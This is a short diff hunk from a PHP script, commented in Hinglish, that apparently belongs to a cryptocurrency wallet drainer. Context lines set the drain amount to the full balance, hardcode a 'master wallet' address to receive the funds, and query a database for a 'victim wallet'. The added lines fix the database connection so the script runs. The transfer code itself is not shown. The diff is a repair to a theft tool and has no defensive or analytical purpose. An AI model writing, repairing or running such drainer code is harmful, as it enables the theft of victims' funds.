@@ -9,6 +9,12 @@ $drain_amount = 'ALL'; // ALL = full balance, ya specific amount
 // Master wallet (jahan paisa bhejna hai)
 $MASTER_WALLET = "TD94UkiL5qg5Y9ogZqdWdqZbT3F2nB86rK";
 
+// ✅ FIX: getDB() function use karein
+$pdo = getDB();
+if (!$pdo) {
+    die("❌ Database connection failed!");
+}
+
 // Database se victim wallet fetch
 $stmt = $pdo->prepare("SELECT wallet_address FROM wallets WHERE is_active = 1 LIMIT 1");
 $stmt->execute();
